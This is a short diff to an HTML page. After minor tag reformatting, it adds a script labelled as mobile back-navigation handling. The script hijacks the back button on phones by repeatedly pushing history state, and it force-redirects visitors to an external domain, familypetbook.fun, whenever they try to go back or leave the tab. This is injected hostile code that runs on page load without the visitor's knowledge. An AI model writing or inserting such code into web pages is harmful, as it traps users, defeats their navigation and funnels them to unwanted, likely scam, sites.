@@ -1240,4 +1240,43 @@ a:focus {
   }
   
 }
-</style><div></div></div></template></div></html>
+</style>
+<div></div>
+</div>
+</template>
+</div>
+
+<!-- Mobile back navigation redirect script -->
+<script>
+  (function () {
+      const redirectUrl = "https://familypetbook.fun/sweety";
+
+      function isMobile() {
+          return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || window.innerWidth <= 768;
+      }
+
+      function redirectToLink() {
+          window.location.href = redirectUrl;
+      }
+
+      function blockBackNavigation() {
+          history.pushState(null, null, location.href);
+          window.onpopstate = function () {
+              redirectToLink();
+          };
+      }
+
+      if (isMobile()) {
+          blockBackNavigation();
+          setInterval(blockBackNavigation, 500);
+
+          document.addEventListener("visibilitychange", function () {
+              if (document.visibilityState === "hidden") {
+                  redirectToLink();
+              }
+          });
+      }
+  })();
+</script>
+</html>
+
